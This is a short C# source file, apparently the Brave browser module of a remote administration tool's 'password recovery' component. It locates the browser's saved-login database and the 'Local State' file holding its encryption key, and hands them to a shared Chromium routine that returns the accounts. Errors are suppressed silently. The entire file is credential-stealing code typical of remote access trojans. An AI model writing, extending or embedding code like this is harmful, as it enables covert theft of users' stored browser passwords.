using RemoteAdmin.Shared;
using System;
using System.Collections.Generic;
using System.IO;

namespace RemoteAdmin.Client.Recovery.Browsers
{
    public class BravePassReader : ChromiumBase
    {
        /// <inheritdoc />
        public override string ApplicationName => "Brave";

        /// <inheritdoc />
        public override List<RecoveredAccount> ReadAccounts()
        {
            try
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data");
                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "BraveSoftware\\Brave-Browser\\User Data\\Local State");
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }
    }
}
